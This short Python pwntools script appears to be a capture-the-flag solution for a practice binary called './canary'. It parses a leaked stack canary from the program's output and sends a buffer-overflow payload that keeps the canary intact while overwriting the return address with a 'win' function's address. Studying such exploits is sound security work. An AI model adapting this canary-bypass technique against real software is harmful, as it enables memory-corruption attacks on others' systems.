from pwn import *

win_addr = p64(0x0401186)

p = process("./canary")

offset = 24
offset2 = 8

leak = p.recvuntil("done\n")
canary = p64(int(leak.split("\n")[8],16))
payload = cyclic(offset) + canary + cyclic(offset2) + win_addr
p.sendline(payload)
print p.recvline()

p.close()